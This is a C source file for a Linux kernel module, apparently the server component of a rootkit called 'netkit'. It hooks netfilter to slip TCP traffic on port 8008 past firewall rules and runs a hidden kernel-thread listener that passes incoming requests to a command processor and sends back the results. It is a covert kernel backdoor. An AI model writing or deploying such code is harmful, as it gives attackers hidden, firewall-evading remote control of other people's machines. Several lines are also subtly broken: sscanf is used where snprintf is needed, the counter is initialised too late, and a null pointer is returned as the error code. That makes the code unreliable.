#include <linux/types.h>
#include <linux/kthread.h>
#include <linux/freezer.h>
#include <linux/sched.h>
#include <linux/errno.h>
#include <linux/random.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/net.h>
#include <linux/delay.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#include "server.h"

#include "../../core/cmd/cmd.h"
#include "../../core/packet/packet.h"
#include "../../sys/mem.h"
#include "../../sys/socket.h"
#include "../../sys/debug.h"
#include "../../sys/symbol.h"
#include "../../sys/task.h"

#define SERVER_IP "0.0.0.0"
#define SERVER_PORT 8008

#define KTHREAD_LOOP_NAME "netkit-loop"

// wait for all conns to finish
static struct kref active_conns;
DECLARE_WAIT_QUEUE_HEAD(all_conns_handled_wait_queue);
static struct task_struct *task_conn_loop = NULL;

static unsigned int hook_function(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{    
    if (skb->protocol != htons(ETH_P_IP) || ip_hdr(skb)->protocol != IPPROTO_TCP || \
            skb->len < ip_hdr(skb)->ihl * 4 + sizeof(struct tcphdr) || ntohs(tcp_hdr(skb)->dest) != SERVER_PORT)
        return NF_ACCEPT;

    NETKIT_LOG("[*] bypassing netfilter...\n");

    refcount_inc(&skb->users);  // incr refc so skb doesn't get free'd when ip_recv_final needs it
    return NF_DROP | (0xFFFF << 16);  // -(retv >> 16) == 1
}

static struct nf_hook_ops nfho = {
    .hook = hook_function,
    .pf = PF_INET,
    .hooknum = NF_INET_LOCAL_IN,
    .priority = NF_IP_PRI_FIRST,
};

static int server_conn_handler(void *args)
{
    struct server_conn *packet = (struct server_conn*)args;
    u8* res_buf = NULL;
    size_t res_buflen = 0;
    int retv;

    kref_get(&active_conns);

    NETKIT_LOG("[*] calling io_process (req_buflen: %lu)...\n", packet->req_buflen);
    retv = io_process(packet->req_buf, packet->req_buflen, &res_buf, &res_buflen);
    retv = socket_write(packet->client_sk, res_buf, res_buflen);

    sock_release(packet->client_sk);
    kzfree(packet->req_buf, packet->req_buflen);
    kzfree(packet, sizeof(*packet));
    kzfree(res_buf, res_buflen);
    
    // kref_sub without release()
    atomic_sub(1, (atomic_t *)&active_conns.refcount);
    wake_up(&all_conns_handled_wait_queue);
    
    return retv;
}

/**
 * Listens to connections, parses the packet and starts packet processing
 */
static int server_conn_loop(void* args)
{
    char kthread_name[29];  // strlen("netkit-conn-handler-") + 8 + 1
    unsigned int kthread_name_id;
    struct task_struct *conn_task;
    struct socket *server_sk;
    struct sockaddr_in *server_addr;
    struct socket *client_sk;
    struct server_conn *conn_data;
    int retv;

    kref_get(&active_conns);
    retv = socket_create(inet_addr(SERVER_IP), htons(SERVER_PORT), &server_sk, &server_addr);
    if (retv < 0)
    {
        NETKIT_LOG("[!] failed to get socket (err: %d)\n", retv);
        goto LAB_OUT_NO_SOCK;
    }

    retv = socket_listen(server_sk, server_addr);
    if (retv < 0)
    {
        NETKIT_LOG("[!] failed to listen (err: %d)\n", retv);
        goto LAB_OUT;
    }

    NETKIT_LOG("[+] started listening for connections\n");
    
    while (likely(!kthread_should_stop()))
    {
        // conn polling needs to be optimized for speed, to make overhead minimal
        NETKIT_LOG("[*] checking for connection...\n");

        if (unlikely(try_to_freeze()))
			continue;

        // use non-blocking socket to be able to respond to kthread_should_stop() and properly clean sockets
        retv = kernel_accept(server_sk, &client_sk, SOCK_NONBLOCK);
        if (likely(retv < 0))
            goto LAB_CONN_REITER;

        NETKIT_LOG("[+] received connection\n");

        // populate conn_data instance
        conn_data = kzmalloc(sizeof(*conn_data), GFP_KERNEL);
        if (IS_ERR(conn_data))
            goto LAB_CONN_ERR_NO_CONN;

        // try to read conn_data content
        conn_data->client_sk = client_sk;
        retv = socket_read(conn_data->client_sk, &conn_data->req_buf, &conn_data->req_buflen);
        if (retv < 0)
            goto LAB_CONN_ERR;

        if (conn_data->req_buflen == 0)
        {
            NETKIT_LOG("[!] got 0 bytes from connection. giving no reply\n");
            goto LAB_CONN_ERR;
        }

        // start kthread
        kthread_name_id = (int)get_random_long();
        sscanf(kthread_name, "netkit-conn-handler-%08x", &kthread_name_id);

        NETKIT_LOG("[*] starting conn handler...\n");

        // child should free conn_data
        conn_task = kthread_run(server_conn_handler, conn_data, kthread_name);
        if (IS_ERR(conn_task))
            goto LAB_CONN_ERR;

LAB_CONN_REITER:
        schedule_timeout_interruptible(HZ / 10);  // 100ms check rate
        continue;

LAB_CONN_ERR:
        if (conn_data->req_buf)
            kzfree(conn_data->req_buf, conn_data->req_buflen);

        kzfree(conn_data, sizeof(*conn_data));
        conn_data = NULL;
LAB_CONN_ERR_NO_CONN:
        sock_release(client_sk);
        client_sk = NULL;
        goto LAB_CONN_REITER;
    }

    NETKIT_LOG("[*] conn loop received kthread_stop...\n");
LAB_OUT:
    NETKIT_LOG("[*] stopping conn loop...\n");
    sock_release(server_sk);

LAB_OUT_NO_SOCK:
    atomic_sub(1, (atomic_t *)&active_conns.refcount);
    wake_up(&all_conns_handled_wait_queue);

    return retv;
}

/**
 * Initializes the kthread for the server
 * Return: 0 if successful
 */
int server_init(void)
{
    int retv = 0;

    // current->nsproxy->net_ns
    nf_register_net_hook(current->nsproxy->net_ns, &nfho);

    NETKIT_LOG("[*] starting server_conn_loop...\n");

    task_conn_loop = kthread_run(server_conn_loop, NULL, KTHREAD_LOOP_NAME);
    if (IS_ERR(task_conn_loop))
    {
        task_conn_loop = NULL;
        return PTR_ERR(task_conn_loop);
    }

    kref_init(&active_conns);

    return retv;
}

int server_exit(void)
{
    int retv;

    NETKIT_LOG("[*] trying to shutdown IO server...\n");

    nf_unregister_net_hook(current->nsproxy->net_ns, &nfho);

    if (!task_conn_loop)
    {
        NETKIT_LOG("[!] task loop does not exist when exiting\n");
        return -ECHILD;
    }

    // don't stop thread when errored (i.e. because of sockets)
    if (TASK_STATE(task_conn_loop) & (TASK_RUNNING | TASK_INTERRUPTIBLE | TASK_UNINTERRUPTIBLE))
    {
        NETKIT_LOG("[*] stopping conn loop...\n");
        retv = kthread_stop(task_conn_loop);
        if (retv < 0)
            NETKIT_LOG("[!] kthread stop returned error\n");
    } else {
        NETKIT_LOG("[-] conn loop is not running (state: %d)\n", TASK_STATE(task_conn_loop));
    }

    // block until all kthreads (including conn loop) are handled
    // use 1 since kref_init sets the counter to 1
    // drawback: if conn handler crashes, this will wait infinitely
    wait_event(all_conns_handled_wait_queue, kref_read(&active_conns) == 1);

    NETKIT_LOG("[+] all connections are closed\n");

    return retv;
}